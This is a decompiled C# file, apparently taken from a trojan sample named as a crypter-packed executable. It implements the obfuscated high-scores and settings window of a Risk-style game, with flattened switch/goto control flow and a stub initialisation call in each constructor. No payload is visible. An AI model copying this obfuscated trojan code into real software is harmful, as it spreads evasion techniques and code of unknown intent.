// Decompiled with JetBrains decompiler
// Type: IEnumUnkn.Collections.StateCallbackCollection
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using IEnumUnkn.Definitions;
using IEnumUnkn.Mappers;
using IEnumUnkn.Rules;
using IEnumUnkn.Structs;
using RiskGame;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Markup;
using System.Windows.Media;

namespace IEnumUnkn.Collections
{
  public class StateCallbackCollection : Window, IComponentConnector
  {
    private List<Player> m_Serializer;
    private ObservableCollection<Importer> _Reader;
    private bool _Decorator;
    private bool _Parser;
    internal StackPanel panel_MainUI;
    internal DataGrid ScoreList;
    internal Label lblPlayerScore;
    internal DataGrid PlayerScoreList;
    internal Label lblError;
    internal TextBlock txtError;
    internal DockPanel panel_Settings;
    internal Label lblMediaDetails;
    internal MediaElement mediaplayer;
    internal Slider slider_Volume;
    internal CheckBox chkMusicEnabled;
    internal CheckBox chkFullscreen;
    internal CheckBox chkHints;
    private bool m_Status;

    public bool Music_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._Decorator;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 2;
        while (true)
        {
          bool flag1;
          int num2;
          bool flag2;
          switch (num1)
          {
            case 0:
            case 2:
              flag2 = this.m_Serializer != null;
              num2 = 3;
              goto label_15;
            case 1:
              if (this.m_Serializer.Count != 0)
              {
                try
                {
                  ((Human) this.m_Serializer[0]).m_Item = value;
                  int num3 = 2;
                  while (true)
                  {
                    switch (num3)
                    {
                      case 0:
                      case 2:
                        goto label_8;
                      case 1:
                      case 3:
                        goto label_12;
                      default:
                        num3 = 3;
                        continue;
                    }
                  }
label_8:
                  Human.TestRequest(this.m_Serializer[0] as Human);
                }
                catch
                {
                  this.IncludeField("An error has occurred. Your music preferences have not been saved.");
                }
label_12:;
              }
              if (value)
              {
                this.mediaplayer.Play();
                goto case 5;
              }
              else
              {
                flag1 = !value;
                num2 = 6;
                goto label_15;
              }
            case 3:
              if (flag2)
              {
                if (!StateCallbackCollection.CloneObject())
                {
                  num1 = 1;
                  continue;
                }
                goto case 5;
              }
              else
                break;
            case 4:
            case 6:
              if (flag1)
              {
                this.mediaplayer.Pause();
                goto case 5;
              }
              else
                goto case 5;
            case 5:
              break;
            case 7:
              goto label_20;
            default:
              if (true)
              {
                num1 = 5;
                continue;
              }
              goto case 3;
          }
          this._Decorator = value;
          num2 = 7;
label_15:
          num1 = num2;
        }
label_20:;
      }
    }

    public bool Hints_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._Parser;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 3;
        while (true)
        {
          int num2 = num1;
          bool flag1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                goto label_2;
              case 1:
              case 5:
                if (flag1)
                {
                  num2 = 4;
                  continue;
                }
                goto label_11;
              case 2:
              case 4:
                goto label_14;
              case 3:
                flag1 = this.m_Serializer != null;
                num2 = 5;
                continue;
              case 6:
                goto label_7;
              default:
                if (StateCallbackCollection.ReadObject())
                {
                  num2 = 0;
                  continue;
                }
                goto label_18;
            }
          }
label_2:
          bool flag2;
          if (flag2)
          {
            try
            {
              ((Human) this.m_Serializer[0]).wrapper = value;
              int num3 = 2;
              while (true)
              {
                switch (num3)
                {
                  case 0:
                  case 2:
                    goto label_4;
                  case 1:
                  case 3:
                    goto label_9;
                  default:
                    num3 = 3;
                    continue;
                }
              }
label_4:
              Human.TestRequest(this.m_Serializer[0] as Human);
            }
            catch
            {
              this.IncludeField("An error has occurred. Your music preferences have not been saved.");
            }
label_9:;
          }
label_11:
          this._Parser = value;
          num1 = 6;
          continue;
label_14:
          flag2 = this.m_Serializer.Count != 0;
          goto label_2;
        }
label_7:
        return;
label_18:;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public StateCallbackCollection(Importer setup, List<Player> caller)
    {
      ListenerManager.InitStub();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      ObservableCollection<Importer> observableCollection = new ObservableCollection<Importer>();
      observableCollection.Add(setup);
      this._Reader = observableCollection;
      this.m_Serializer = caller;
      this.RegisterField(false, ((Human) this.m_Serializer[0]).m_Item, ((Human) this.m_Serializer[0]).wrapper);
      foreach (Player player in this.m_Serializer)
      {
        player.Army_strength = 0;
        player._Setter = 0;
        player.Territoriesowned = 0;
        player.definition = 0;
        player.Color = (SolidColorBrush) null;
      }
      this.PlayerScoreList.ItemsSource = (IEnumerable) this._Reader;
      this.lblPlayerScore.Visibility = Visibility.Visible;
      this.PlayerScoreList.Visibility = Visibility.Visible;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public StateCallbackCollection(List<Player> init, bool colneeded)
    {
      ListenerManager.InitStub();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.RegisterField(colneeded, ((Human) init[0]).m_Item, ((Human) init[0]).wrapper);
      this.m_Serializer = init;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public StateCallbackCollection(bool rejectinfo, bool appendpred, bool outputserv)
    {
      int num = 3;
      if (true)
        goto label_3;
label_1:
      ListenerManager.InitStub();
      if (!StateCallbackCollection.CloneObject())
      {
        num = 2;
        goto label_3;
      }
label_2:
      // ISSUE: explicit constructor call
      base.\u002Ector();
      goto label_5;
label_3:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            goto label_1;
          case 1:
          case 2:
            goto label_2;
          case 4:
            goto label_5;
          case 5:
            goto label_8;
          default:
            num = 4;
            continue;
        }
      }
label_8:
      return;
label_5:
      this.RegisterField(rejectinfo, appendpred, outputserv);
      if (false)
        return;
      num = 5;
      goto label_3;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RegisterField(bool canasset, bool ispred, bool updatecontrol)
    {
      int num1 = 6;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              this.InitializeComponent();
              if (StateCallbackCollection.ReadObject())
              {
                num2 = 3;
                continue;
              }
              goto label_16;
            case 1:
            case 3:
              goto label_16;
            case 2:
              goto label_17;
            case 4:
              if (flag)
              {
                ((StubServiceMapper) Application.Current).ConnectRequest((Window) this);
                ((StubServiceMapper) Application.Current).InitRequest((Window) this);
                num2 = 7;
                continue;
              }
              goto label_12;
            case 5:
              goto label_3;
            case 7:
              goto label_22;
            default:
              if (!StateCallbackCollection.CloneObject())
              {
                num2 = 5;
                continue;
              }
              goto label_22;
          }
        }
label_3:
label_4:
        try
        {
          ObservableCollection<Importer> observableCollection = Importer.ResolveMapper();
          int num3 = 4;
          while (true)
          {
            int num4 = num3;
            while (true)
            {
              switch (num4)
              {
                case 0:
                case 4:
                  this.ScoreList.ItemsSource = (IEnumerable) observableCollection;
                  num4 = 3;
                  continue;
                case 1:
                case 3:
                  if (observableCollection.Count != 0)
                    goto label_14;
                  else
                    goto case 2;
                case 2:
                  this.IncludeField("There aren't any completed games saved on file.");
                  if (true)
                  {
                    num4 = 5;
                    continue;
                  }
                  goto case 0;
                case 5:
                  goto label_14;
                default:
                  goto label_9;
              }
            }
label_9:
            num3 = 2;
          }
        }
        catch (Exception ex)
        {
          this.IncludeField("An error occurred while attempting to retrieve the leaderboard.");
        }
label_14:
        flag = updatecontrol;
        num1 = 4;
        continue;
label_16:
        this.DataContext = (object) this;
        this.StateChanged += new EventHandler(((StubServiceMapper) Application.Current).CalcRequest);
        this.Music_enabled = canasset;
        num1 = 2;
        continue;
label_17:
        this.Hints_enabled = ispred;
        if (this._Decorator)
        {
          this.mediaplayer.Play();
          goto label_3;
        }
        else
          goto label_4;
      }
label_12:
      return;
label_22:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void IncludeField(string res)
    {
      this.lblError.Visibility = Visibility.Visible;
      this.txtError.Text = res;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CreateField(object reference, RoutedEventArgs result)
    {
      int num1 = 0;
      if (StateCallbackCollection.ReadObject())
        goto label_10;
label_1:
      CreatorStructDef creatorStructDef;
      Application.Current.MainWindow = (Window) creatorStructDef;
      this.Close();
      creatorStructDef.Show();
      int num2 = 7;
label_9:
      num1 = num2;
label_10:
      Window window;
      int num3;
      switch (num1)
      {
        case 0:
          if (this.m_Serializer == null)
          {
            num3 = 1;
            break;
          }
          num2 = 2;
          goto label_9;
        case 1:
        case 3:
          Application.Current.MainWindow = window;
          this.Close();
          window.Show();
          return;
        case 2:
          num3 = this.m_Serializer.Count == 0 ? 1 : 0;
          break;
        case 4:
        case 5:
          goto label_1;
        case 6:
          window = (Window) new MessageBridgeRule(this.Music_enabled, this.Hints_enabled, ((StubServiceMapper) Application.Current).VisitRequest((Window) this));
          goto case 1;
        case 7:
          return;
        default:
          num2 = 1;
          goto label_9;
      }
      if (num3 == 0)
      {
        creatorStructDef = new CreatorStructDef(this.m_Serializer, ((StubServiceMapper) Application.Current).VisitRequest((Window) this));
        num2 = 5;
        goto label_9;
      }
      else
      {
        num2 = 6;
        goto label_9;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Quit(object sender, RoutedEventArgs e) => this.Close();

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num1 = 3;
      if (false)
        return;
      bool status;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            if (!status)
            {
              this.m_Status = true;
              goto case 4;
            }
            else
            {
              num1 = 5;
              continue;
            }
          case 2:
            goto label_10;
          case 3:
            status = this.m_Status;
            num1 = 0;
            continue;
          case 4:
            Application.LoadComponent((object) this, new Uri("/IEnumUnkn;component/highscores.xaml", UriKind.Relative));
            num1 = 6;
            continue;
          case 5:
            goto label_11;
          case 6:
            goto label_9;
          default:
            int num2 = 4;
            num1 = StateCallbackCollection.CloneObject() ? num2 : num2;
            continue;
        }
      }
label_10:
      return;
label_11:
      return;
label_9:;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int key_start, object token)
    {
      int num1 = 7;
      if (!StateCallbackCollection.CloneObject())
        goto label_19;
label_11:
      this.m_Status = true;
      num1 = 9;
label_19:
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_24;
          case 1:
            goto label_25;
          case 2:
            goto label_11;
          case 3:
            int num3;
            switch (num2)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                this.lblPlayerScore = (Label) token;
                num3 = 4;
                break;
              case 4:
                goto label_12;
              case 5:
                goto label_13;
              case 6:
                goto label_14;
              case 7:
                goto label_15;
              case 8:
                goto label_16;
              case 9:
                goto label_17;
              case 10:
                this.lblMediaDetails = (Label) token;
                num1 = 8;
                continue;
              case 11:
                this.mediaplayer = (MediaElement) token;
                num3 = 0;
                break;
              case 12:
                goto label_7;
              case 13:
                goto label_8;
              case 14:
                goto label_9;
              case 15:
                goto label_10;
              default:
                num3 = 2;
                break;
            }
            num1 = num3;
            continue;
          case 4:
            goto label_26;
          case 5:
            goto label_27;
          case 6:
            goto label_28;
          case 7:
            num2 = key_start;
            if (!StateCallbackCollection.CloneObject())
            {
              num1 = 3;
              continue;
            }
            goto label_5;
          case 8:
            goto label_29;
          case 9:
            goto label_30;
          default:
            num1 = 1;
            continue;
        }
      }
label_1:
      this.panel_MainUI = (StackPanel) token;
      return;
label_2:
      this.ScoreList = (DataGrid) token;
      return;
label_5:
      return;
label_7:
      this.slider_Volume = (Slider) token;
      return;
label_8:
      this.chkMusicEnabled = (CheckBox) token;
      return;
label_9:
      this.chkFullscreen = (CheckBox) token;
      return;
label_10:
      this.chkHints = (CheckBox) token;
      return;
label_12:
      this.PlayerScoreList = (DataGrid) token;
      return;
label_13:
      ((ButtonBase) token).Click += new RoutedEventHandler(this.CreateField);
      return;
label_14:
      ((ButtonBase) token).Click += new RoutedEventHandler(this.Quit);
      return;
label_15:
      this.lblError = (Label) token;
      return;
label_16:
      this.txtError = (TextBlock) token;
      return;
label_17:
      this.panel_Settings = (DockPanel) token;
      return;
label_29:
      return;
label_28:
      return;
label_27:
      return;
label_26:
      return;
label_25:
      return;
label_30:
      return;
label_24:;
    }

    internal static bool ReadObject() => true;

    internal static bool CloneObject() => false;
  }
}
